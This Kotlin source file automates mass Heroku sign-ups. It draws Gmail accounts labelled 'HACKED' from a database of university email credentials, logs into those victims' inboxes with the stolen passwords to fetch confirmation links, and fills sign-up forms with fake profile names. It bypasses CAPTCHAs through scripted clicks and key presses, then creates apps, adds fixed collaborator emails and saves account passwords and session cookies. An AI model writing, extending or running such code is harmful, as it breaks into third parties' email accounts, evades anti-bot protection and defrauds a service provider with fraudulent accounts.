package net.scr0pt.thirdservice.heroku

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import net.scr0pt.selenium.*
import net.scr0pt.thirdservice.mlab.loginGoogle
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.thirdservice.openload.bypassCaptcha
import net.scr0pt.utils.FakeProfile
import net.scr0pt.utils.RobotManager
import net.scr0pt.utils.tempmail.Gmail
import net.scr0pt.utils.tempmail.event.MailReceiveEvent
import net.scr0pt.utils.tempmail.models.Mail

import net.scr0pt.utils.webdriver.DriverManager
import org.apache.commons.lang3.RandomUtils
import java.awt.event.KeyEvent

/**
 * Created by Long
 * Date: 10/18/2019
 * Time: 9:11 PM
 */

fun main() {
    HerokuRegister().run()
}


class HerokuRegister {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val accountDatabase = mongoClient.getDatabase("edu-school-account")
    val eduCollection = accountDatabase.getCollection("vimaru-email-info")

    val mongoClient2 =
            MongoClients.create(MongoConnection.megaConnection)
    val herokuDatabase = mongoClient2.getDatabase("heroku")
    val herokuCollection = herokuDatabase.getCollection("heroku-account")
    var isDone = false

    fun run() {
        while (true) {
            val doc = eduCollection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))
            if (doc != null && doc.containsKey("Allow less secure apps")) {
                val gmailUsername = doc.getString("email")
                val gmailPassword = doc.getString("new_pass") ?: doc.getString("pass")
                val gmail_recover_email: String? = doc.getString("recover_email")

                if (herokuCollection.countDocuments(org.bson.Document("email", gmailUsername)) > 0L) continue

                val appName = randomAppname()
                val collaboratorEmailList = arrayListOf(
                        "brucealmighty5daeae612ce20558@gmail.com",
                        "alphahoai@gmail.com"
                )
                val result = FakeProfile.getNewProfile()
                val first = result?.name?.first ?: "Bruce"
                val last = result?.name?.last ?: "Lee"
                println(gmailUsername)
                println(first)
                println(last)
                registerHerokuRobot(
                        gmailUsername = gmailUsername,
                        gmailPassword = gmailPassword,
                        email = gmailUsername,
                        appName = appName,
                        collaboratorEmailList = collaboratorEmailList,
                        password = "Bruce_${System.currentTimeMillis()}",
                        firstName = first,
                        lastName = last,
                        herokuCollection = herokuCollection
                )

                while (!isDone) Thread.sleep(5000)


//            registerHeroku(
//                    gmailUsername = gmailUsername,
//                    gmailPassword = gmailPassword,
//                    gmail_recover_email = gmail_recover_email,
//                    email = gmailUsername,
//                    appName = appName,
//                    collaboratorEmailList = collaboratorEmailList,
//                    password = "Bruce_${System.currentTimeMillis()}",
//                    firstName = first,
//                    lastName = last,
//                    driver = Browser.firefox,
//                    herokuCollection = herokuCollection
//            )
            }
        }
    }

    fun registerHerokuRobot(gmailUsername: String, gmailPassword: String, email: String, appName: String, collaboratorEmailList: ArrayList<String>, password: String, firstName: String, lastName: String, herokuCollection: MongoCollection<org.bson.Document>) {
        isDone = false

        RobotManager().apply {
            openBrowser()
            browserGoTo("https://signup.heroku.com")

            robot.keyPress(KeyEvent.VK_HOME)
            robot.keyRelease(KeyEvent.VK_HOME)


            clearAndPasteInput(firstName)

            tab()
            clearAndPasteInput(lastName)

            tab()
            clearAndPasteInput(email)

            tab()

//ignore company name

            tab()//role
            robot.keyPress(KeyEvent.VK_HOME)
            robot.keyRelease(KeyEvent.VK_HOME)
            for (i in 0..(RandomUtils.nextInt(1, 7))) {
                robot.keyPress(KeyEvent.VK_DOWN)
                robot.keyRelease(KeyEvent.VK_DOWN)
                sleep()
            }


            tab()//country default VN
//            robot.keyPress(KeyEvent.VK_HOME)
//            robot.keyRelease(KeyEvent.VK_HOME)
//            for (i in 0..(RandomUtils.nextInt(1, 242))) {
//                robot.keyPress(KeyEvent.VK_DOWN)
//                robot.keyRelease(KeyEvent.VK_DOWN)
//                sleep()
//            }

            tab()//programing language
            robot.keyPress(KeyEvent.VK_HOME)
            robot.keyRelease(KeyEvent.VK_HOME)
            for (i in 0..(RandomUtils.nextInt(1, 12))) {
                robot.keyPress(KeyEvent.VK_DOWN)
                robot.keyRelease(KeyEvent.VK_DOWN)
                sleep()
            }

            tab()//captcha button
            robot.keyPress(KeyEvent.VK_ENTER)
            robot.keyRelease(KeyEvent.VK_ENTER)
            sleep()
            robot.keyPress(KeyEvent.VK_END)
            robot.keyRelease(KeyEvent.VK_END)
            sleep()

            doooo(this, gmailUsername, gmailPassword, email, appName, collaboratorEmailList, password, firstName, lastName, herokuCollection)
        }
    }

    private fun doooo(robotManager: RobotManager, gmailUsername: String, gmailPassword: String, email: String, appName: String, collaboratorEmailList: ArrayList<String>, password: String, firstName: String, lastName: String, herokuCollection: MongoCollection<org.bson.Document>) {
        with(robotManager) {
            val baseX = 1170
//            val baseX = 900
            val initialResolveCaptchaBtn = Pair<Int, Int>(750, screenSize.height - 80)
//            val initialResolveCaptchaBtn = Pair<Int, Int>(470, screenSize.height - 75)
            val newCapthchaBtn = Pair<Int, Int>(870, screenSize.height - 190)
//            val newCapthchaBtn = Pair<Int, Int>(595, 580)
            val multipleCorrect = Pair<Int, Int>(870, screenSize.height - 160)
//            val multipleCorrect = Pair<Int, Int>(590, 590)
            val createNewAccountBtn = Pair<Int, Int>(baseX, screenSize.height - 200)
            val registerTime = System.currentTimeMillis()
            println("doooo 1")
            bypassCaptcha(initialResolveCaptchaBtn, multipleCorrect, newCapthchaBtn, robotManager, onSuccess = {
                println("doooo 2")

                click(createNewAccountBtn)//create btn
                longSleep()


                for (i in 0..20) {
                    println("doooo 3")
                    sleep()
                    click(screenSize.width / 4, screenSize.height / 2)//safe point screen

                    val txt = printScreenText()

                    if (txt == "Retry later!") {
                        println("doooo 3.5")
                        closeWindow()
                        isDone = true
                        return@bypassCaptcha
                    } else if (txt.contains("We could not verify you are not a robot. Please try the CAPTCHA again.")) {
                        println("doooo 4")
                        robot.keyPress(KeyEvent.VK_END)
                        robot.keyRelease(KeyEvent.VK_END)
                        sleep()

                        //capthca position
                        click(baseX, screenSize.height - 300)

                        doooo(robotManager, gmailUsername, gmailPassword, email, appName, collaboratorEmailList, password, firstName, lastName, herokuCollection)
                        return@bypassCaptcha
                    } else if (txt.contains("Sorry. A user with that email address already exists, or the email was invalid.")
                            || txt.contains("Help us make some avocado toast!")
                    ) {
                        println("doooo 5")
                        robot.keyPress(KeyEvent.VK_ALT)
                        robot.keyPress(KeyEvent.VK_F4)
                        robot.keyRelease(KeyEvent.VK_ALT)
                        robot.keyRelease(KeyEvent.VK_F4)
                        sleep()
                        isDone = true
                        return@bypassCaptcha
                    } else if (txt.contains("Almost there …\nPlease check your email") && txt.contains("to confirm your account.")) {
                        println("doooo 6")
                        closeWindow()
                        val gmail = Gmail(gmailUsername, gmailPassword)
                        gmail.onEvent(MailReceiveEvent(
                                key = "ona_heroku_sender",
                                validator = { mail ->
                                    (mail.id ?: 0) > registerTime &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com") &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
                                },
                                callback = { mails ->
                                    val mail =
                                            mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
                                    val acceptLink = mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")
                                    if (acceptLink != null) {
                                        println(acceptLink)
                                        gmail.logout()
                                        installDriver(acceptLink, email, appName, collaboratorEmailList, password, firstName, lastName, herokuCollection)
                                    }
                                },
                                once = false,
                                new = true,
                                fetchContent = true
                        ))
                        return@bypassCaptcha
                    }
                }
            }, onFail = {
                isDone = true
                closeWindow()
            })
        }
    }

    private fun installDriver(acceptLink: String, email: String, appName: String, collaboratorEmailList: ArrayList<String>, password: String, firstName: String, lastName: String, herokuCollection: MongoCollection<org.bson.Document>) {
        val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox)
        val pageManager = PageManager(driverManager, acceptLink)
        pageManager.addPageList(arrayListOf(
                HerokuSetYourPasswordPage(password = password) {
                    herokuCollection.updateOne(
                            org.bson.Document("email", email),
                            Updates.set("verify", true)
                    )
                    println("HerokuSetYourPasswordPage success")
                }.apply {
                    onPageDetect = {
                        herokuCollection.insertOne(
                                org.bson.Document("email", email)
                                        .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                        .append("verify", true)
                        )
                    }
                },
                HerokuWelcomePage {
                    println("HerokuWelcomePage success")
                },
                HerokuDashboardPage(action = HerokuDashboardPage.HerokuDashboardAction.CREATE_NEW_APP) {
                    println("HerokuDashboardPage success")
                }.apply {
                    onPageDetect = {
                        herokuCollection.updateOne(
                                org.bson.Document("email", email),
                                Updates.set("cookies", pageManager.driver.cookieStr)
                        )
                    }
                },
                HerokuCreateNewAppPage(appName = appName) {
                    herokuCollection.updateOne(org.bson.Document("email", email), Updates.set("appName", appName))
                    println("HerokuCreateNewAppPage ${appName} success")
                },
                HerokuDeployPagePage {
                    println("HerokuDeployPagePage success")
                },
                HerokuAccessPage(collaboratorEmailList = collaboratorEmailList) {
                    println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                }
        ))

        pageManager.run { pageResponse ->
            println(pageResponse)
            if (pageResponse is HerokuResponse.COLLABORATOR_ADDED) {
                herokuCollection.updateOne(
                        org.bson.Document("email", email),
                        Updates.pushEach("collaborators", collaboratorEmailList)
                )
            }
            isDone = true
            pageManager.driver.close()
        }
    }

    fun registerHeroku(
            email: String,
            password: String,
            firstName: String,
            lastName: String,
            appName: String,
            collaboratorEmailList: ArrayList<String>,
            driver: DriverManager,
            herokuCollection: MongoCollection<org.bson.Document>,
            gmailUsername: String,
            gmailPassword: String,
            gmail_recover_email: String?
    ) {
        loginGoogle(gmailUsername, gmailPassword, driver, onLoginSuccess = {
            PageManager(driver, "https://signup.heroku.com").apply {
                addPageList(arrayListOf<Page>(
                        HerokuRegisterPage(firstName, lastName, email) {
                            herokuCollection.insertOne(
                                    org.bson.Document("email", email)
                                            .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                            .append("verify", false)
                            )
                            println("HerokuRegisterPage success")
                        },
                        HerokuRegisterDoneWaitingCheckEmailPage(gmailUsername, gmailPassword, startTime) {
                            println("HerokuRegisterDone_WaitingCheckEmail_Page success")
                        },
                        GoogleGmailPage() {
                            println("GoogleGmailPage success")
                        },
                        HerokuSetYourPasswordPage(password = password) {
                            herokuCollection.updateOne(
                                    org.bson.Document("email", email),
                                    Updates.set("verify", true)
                            )
                            println("HerokuSetYourPasswordPage success")
                        },
                        HerokuWelcomePage {
                            println("HerokuWelcomePage success")
                        },
                        HerokuDashboardPage(action = HerokuDashboardPage.HerokuDashboardAction.CREATE_NEW_APP) {
                            println("HerokuDashboardPage success")
                        },
                        HerokuCreateNewAppPage(appName = appName) {
                            herokuCollection.updateOne(org.bson.Document("email", email), Updates.set("appName", appName))
                            println("HerokuCreateNewAppPage ${appName} success")
                        },
                        HerokuDeployPagePage {
                            println("HerokuDeployPagePage success")
                        },
                        HerokuAccessPage(collaboratorEmailList = collaboratorEmailList) {
                            println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                        }
                ))
                run { pageResponse ->
                    println(pageResponse)
                    if (pageResponse is HerokuResponse.COLLABORATOR_ADDED) {
                        herokuCollection.updateOne(
                                org.bson.Document("email", email),
                                Updates.pushEach("collaborators", collaboratorEmailList)
                        )
                    }

                    Thread.sleep(60000)
                    driver.close()
                    Thread.sleep(180000)
                }
            }
        }, recoverEmail = gmail_recover_email)
    }
}

class HerokuRegisterPage(
        val firstName: String,
        val lastName: String,
        val email: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        try {
            pageStatus.driver.executeScript(
                    """
                    function randInt(max, min){
                        return Math.floor(Math.random() * (+max - +min + 1)) + +min;
                    }
                    var signupForm = document.querySelector("form.signup-form");
                    signupForm.first_name.value = "${firstName}";
                    signupForm.last_name.value = "${lastName}";
                    signupForm.email.value = "${email}";
                    signupForm.role.value = signupForm.role[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.self_declared_country.value = signupForm.self_declared_country[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.main_programming_language.value = signupForm.main_programming_language[randInt(1, signupForm.role.length - 1)].value;
                    
                    document.querySelector('input[value="Create Free Account"]').click();
                    
        """.trimIndent()
            )
        } catch (e: Exception) {
        }

        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus) =
            pageStatus.title == "Heroku | Sign up" &&
                    pageStatus.url.startsWith("https://signup.heroku.com") &&
                    pageStatus.equalsText(".header-main h2", "Sign up for free and experience Heroku today")
}

class HerokuRegisterDoneWaitingCheckEmailPage(
        val gmailUsername: String,
        val gmailPassword: String,
        val registerTime: Long,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    var gmail: Gmail? = null

    override fun action(pageStatus: PageStatus): Response {
        if (gmail == null) {
            gmail =
                    Gmail(gmailUsername, gmailPassword).apply {
                        onEvent(MailReceiveEvent(
                                key = "ona_heroku_sender",
                                validator = { mail ->
                                    (mail.id ?: 0) > registerTime &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com") &&
                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
                                },
                                callback = { mails ->
                                    val mail =
                                            mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
                                    val acceptLink = mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")
                                    if (acceptLink != null) {
                                        this.logout()
                                        pageStatus.driver.get(acceptLink)
                                    }
                                },
                                once = false,
                                new = true,
                                fetchContent = true
                        )
                        )
                    }
        }
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/account") &&
                    pageStatus.notContain(".header-main h2") &&
                    pageStatus.equalsText(".account-page .account-content h2", "Almost there …") &&
                    pageStatus.contain(".account-page .account-content h3", "Please check your email")
}

class HerokuSetYourPasswordPage(
        val password: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.sendKeysFirstEl(password, "input#user_password") ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.sendKeysFirstEl(password, "input#user_password_confirmation")
                ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.clickFirstEl("form.signup-form.confirmation-form .input-group input[type=\"submit\"]")
                ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/confirm") &&
                    pageStatus.notContain(".header-main h2") &&
                    pageStatus.equalsText(".account-page .account-content h2", "Set your password") &&
                    pageStatus.equalsText(".account-page .account-content h3", "Create your password and log in to your Heroku account.")
}


class HerokuWelcomePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.clickFirstEl("form#final_login .center input[type=\"submit\"]")
                ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/account/accept/ok") &&
                    pageStatus.notContain(".header-main h2")  &&
                    pageStatus.equalsText(".account-page .account-content h2", "Welcome to Heroku") &&
                    pageStatus.notContain(".account-page .account-content h3")  &&
                    pageStatus.doc?.selectFirst("form#final_login .center input[type=\"submit\"]")?.attr("value") == "Click here to proceed"
}


class HerokuCreateNewAppPage(
        val appName: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.sendKeysFirstEl(appName, "form.new-app-view .new-app-name input")
                ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.clickFirstEl("form.new-app-view button.create-app-button") ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/new-app")
}

class HerokuDeployPagePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.get(pageStatus.url.substringBefore("/deploy") + "/access")
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/apps/") &&
                    pageStatus.url.contains("/deploy/heroku-git")
}


class HerokuAccessPage(
        collaboratorEmailList: ArrayList<String>,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    data class AddingCollaboratorEmailStatus(val collaboratorEmail: String, var isAdded: Boolean = false)

    private val collaboratorEmailObjectList: List<AddingCollaboratorEmailStatus> = collaboratorEmailList.map { AddingCollaboratorEmailStatus(it) }
    override fun onWaiting(pageStatus: PageStatus): Response? {
        pageStatus.doc?.select(".collaborator-list tr.collaborator-item")?.forEach {
            val txt = it.text().trim()
            val email = txt.split(" ")[0]
//            val role = txt.split(" ")[1]

            collaboratorEmailObjectList.firstOrNull { collaboratorEmail -> collaboratorEmail.collaboratorEmail == email }?.let {
                it.isAdded = true
            }
        }

        if (collaboratorEmailObjectList.firstOrNull { !it.isAdded } == null) {
            return HerokuResponse.COLLABORATOR_ADDED()
        }
        return null
    }

    override fun action(pageStatus: PageStatus): Response {
        collaboratorEmailObjectList.forEach {
            val collaboratorEmail = it.collaboratorEmail
            pageStatus.driver.clickFirstEl("button.hk-button--secondary", equals = "Add collaborator")
                    ?: return@action Response.NOT_FOUND_ELEMENT()
            pageStatus.driver.sendKeysFirstEl(collaboratorEmail, "input", filter = { el -> "user@domain.com".equals(el.getAttribute("placeholder"), ignoreCase = true) })
                    ?: return@action Response.NOT_FOUND_ELEMENT()
            pageStatus.driver.clickFirstEl("button.hk-button--primary", equals = "Save changes")
                    ?: return@action Response.NOT_FOUND_ELEMENT()
            Thread.sleep(2000)
        }
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/apps/") &&
                    pageStatus.url.contains("/access")
}


class GoogleGmailPage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        val link = pageStatus.html.substringAfter("Thanks for signing up with Heroku! You must follow this link to activate your account: ")?.substringBefore("Have fun")?.trim()
        if (link.startsWith("https://id.heroku.com/account/accept/")) {
            pageStatus.driver.get(link)
        }
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://mail.google.com/mail/") &&
                    pageStatus.html.contains("Thanks for signing up with Heroku! You must follow this link to activate your account") &&
                    pageStatus.html.contains("https://id.heroku.com/account/accept/") &&
                    pageStatus.html.contains("Have fun")
}
